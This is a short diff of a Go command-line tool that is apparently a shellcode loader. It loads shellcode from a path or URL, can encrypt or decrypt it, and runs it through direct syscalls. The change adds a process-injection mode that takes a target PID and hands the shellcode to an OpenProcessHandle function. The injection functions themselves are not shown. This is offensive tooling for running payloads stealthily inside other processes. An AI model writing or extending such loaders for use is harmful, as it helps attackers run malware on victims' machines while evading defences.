@@ -10,17 +10,17 @@ import (
 )
 
 func main() {
-	path := flag.String("p", "", "path or URL to shellcode file")
+	path := flag.String("f", "", "path or URL to shellcode file")
 	encrypt := flag.String("e", "", "a 32 char long key used to encrypt the file")
 	decrypt := flag.String("d", "", "a 32 char long key used to decrypt the file")
 	inject := flag.String("i", "", `method of code injection.
 	methods are:
 	- syscall (virtualalloc READWRITE -> RTLCOPY -> virtualprotect EXECUTRE -> syscall)
 	- thread () // not implemented
-	- proc () // not implemented
+	- proc ()
 	example:
-	goget -m syscall
-	`)
+	goget -m syscall`)
+	pid := flag.Uint("p", 0, "pid of a process to inject into")
 	flag.Parse()
 
 	// validate required args
@@ -106,6 +106,12 @@ func main() {
 		switch *inject {
 		case "syscall":
 			DirectSyscall(data)
+		case "proc":
+			if *pid == 0 {
+				panic("[-] no PID !")
+			} else {
+				OpenProcessHandle(data, uint32(*pid))
+			}
 		default:
 			DirectSyscall(data)
 		}
